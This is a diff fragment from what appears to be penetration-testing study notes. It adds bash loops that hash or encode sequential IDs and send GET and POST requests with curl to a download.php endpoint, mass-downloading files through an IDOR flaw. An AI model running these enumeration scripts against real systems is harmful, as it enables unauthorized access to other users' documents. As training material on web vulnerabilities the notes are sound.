@@ -1252,7 +1252,19 @@ done
 
 for i in {1..20}; do
     for hash in $(echo -n $i | base64 -w 0 | jq -sRr @uri | tr -d ' -'); do
-        curl -sOJ  http://<IP address>/download.php?contract=$hash
+        curl -sOJ  http://<IP address>:<port>/download.php?contract=$hash
+    done
+done
+```
+
+- Mass Enumeration Encoded IDOR Parameter POST Request
+
+```
+#!/bin/bash
+
+for i in {1..10}; do
+    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
+        curl -sOJ -X POST -d "contract=$hash" http://<IP address>:<port>/download.php
     done
 done
 ```
